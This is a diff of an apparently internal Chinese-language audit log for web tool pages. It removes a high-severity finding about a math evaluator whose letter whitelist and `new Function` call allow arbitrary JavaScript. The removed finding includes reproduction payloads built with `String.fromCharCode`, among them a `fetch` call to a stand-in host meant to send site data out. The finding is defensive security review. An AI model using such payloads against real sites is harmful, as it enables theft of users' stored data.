@@ -2797,19 +2797,6 @@
 
 ## W 批 · IT 计算/文本（2026-11-04）
 
-### IT-N470 表达式求值器的"字符白名单"放行任意字母标识符，`new Function` 内可直达 `eval`/`fetch`/`localStorage`（高，安全）
-- 页面：`tools/it/math-evaluator.html`
-- 问题：白名单 `/^[0-9+\-*\/%^().,\sA-Za-z%]+$/`（`:293`）放行全部 `A-Za-z`，并不只限"函数名"；随后 `new Function(... , 'return ('+js+')')`（`:296`）在页面全局作用域执行，表达式可直接引用 `eval`、`fetch`、`document`、`localStorage` 等全局对象，字符串可用 `String.fromCharCode(...)` 无引号构造。页面 `:115`、`:119`、`:121` 却宣称"字符白名单校验""Shunting-yard 解析""绝不可用 eval"。
-- 行号：`:293`、`:295-297`；文案 `:115`、`:119`、`:121`、`:112`、`:8`
-- 复现（node 复刻同一校验 + `new Function` 路径）：
-  - `eval(String.fromCharCode(50,42,51))` → 实际返回数字 `6`（页面显示「结果：6」），期望被拦截为"表达式含非法字符"；
-  - `eval(String.fromCharCode(49,43,49))` → 实际 `2`；
-  - `fetch(String.fromCharCode(47,47,120,46,99))` → 实际真的调用 `fetch('//x.c')`（node 侧报 `Invalid URL`，证明已执行），把字符码换成本站数据即可外发；
-  - `localStorage.getItem(...)` / `document.title` 同样可直接访问（node 无这两个全局才报未定义，浏览器中存在）。
-- 影响：任何粘贴来的"表达式"都能在本站执行任意 JS：读取/改写全站共用的 localStorage（历史、偏好）、把数据经 `fetch` 外送、篡改页面内容；白名单形同虚设，与页面自述的安全模型相反。
-- 方案：白名单改为 `[0-9+\-*/().,\s^%]` + 严格枚举函数名（先 tokenize 再校验标识符只能是 `sin/cos/...`），或换成真正的 Shunting-yard 解析器（`:119` 已如此声称）；彻底移除 `new Function`。
-- 假工具：否
-
 ### IT-N472 拼音表仅 59 个有效汉字，默认"中文转拼音"把其余汉字静默删除且不音节分隔（高，承诺未实现）
 - 页面：`tools/it/slug-generator-advanced.html`
 - 问题：`PINYIN`（`:274-282`）共 64 键，其中 5 个是永不匹配的死键（`'的2'`、`'计2'`、`'开2'`、`'前2'`、`'后2'`），有效单字仅 59 个；`slugify` 对未命中字 `PINYIN[c]||(trans?'x':'')`（`:302`），默认（`transliterate` 未勾、`:182`）直接产出空串即被删除；已命中字也直接粘连，不插分隔符。
@@ -2843,7 +2830,6 @@
 ### 覆盖清单（W 批 IT 计算/文本）
 - `matrix-determinant`：无高优/中优缺陷（`detRec` 与 BigInt Bareiss 精确值对照 100 组随机 2–5 阶全对；5×5 整数矩阵得 −4656 一致；Sarrus 正负号与 2×2/3×3 公式均正确）。
 - `vector-magnitude`：IT-N477（中）；无高优缺陷（模长/单位向量公式正确：`|(3,4)|=5`，三维方向角 `acos(vᵢ/|v|)` 正确）。
-- `math-evaluator`：IT-N470（高，安全）。
 - `slug-generator-advanced`：IT-N472（高，承诺未实现）。
 - `keyword-extractor`：IT-N478（中）；无高优缺陷（停用词表实测 183 中文 + 132 英文，标签/表格/图表输出均经 `ToolBox.escHtml`）。
 - 方法声明：逐页通读上述 8 页源码，在 `/tmp` 用 `node` 直接抽取/复刻页面原函数（页面真实 `md5()`、表达式白名单 + `new Function`、叉积夹角、`detRec` + BigInt Bareiss、页面真实 `PINYIN` 表 + `slugify()`、`tokenizeChinese`/`filterKeywords`/`deduplicateSubstrings` + 页面真实停用词表、`isPrime`/因式分解）逐一给出「输入 → 实际 / 期望」；MD5 用 `crypto.createHash('md5')` 与 `printf '中文' | md5` 双对照；`onclick` 截断用 `python3 html.parser` 验证属性拆分。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。
